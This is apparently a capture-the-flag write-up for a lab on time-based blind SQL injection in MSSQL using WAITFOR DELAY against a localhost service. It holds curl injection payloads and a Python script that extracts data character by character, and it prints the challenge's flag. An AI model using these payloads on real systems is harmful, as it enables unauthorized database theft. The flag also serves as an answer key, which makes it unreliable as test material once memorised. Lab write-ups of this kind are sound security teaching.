# SQLi-030: MSSQL WAITFOR DELAY - Writeup

## Flag: `FLAG{w41tf0r_d3l4y_mssql}`

## DETECT

```bash
# Normal
time curl "http://localhost:5030/validate?email=test@test.com"

# Time delay (3 seconds)
time curl "http://localhost:5030/validate?email=test'; WAITFOR DELAY '0:0:3'--"
```

## EXTRACT

```bash
# Conditional delay
time curl "http://localhost:5030/validate?email=test'; IF (SELECT SUBSTRING(value,1,1) FROM flags)='F' WAITFOR DELAY '0:0:2'--"
```

🎉 **FLAG:** `FLAG{w41tf0r_d3l4y_mssql}`

## Exploit

```python
import requests, time

def check(cond):
    start = time.time()
    payload = f"test'; IF ({cond}) WAITFOR DELAY '0:0:2'--"
    requests.get(f"http://localhost:5030/validate?email={payload}")
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
            flag += c
            print(f"[+] {flag}")
            break
```
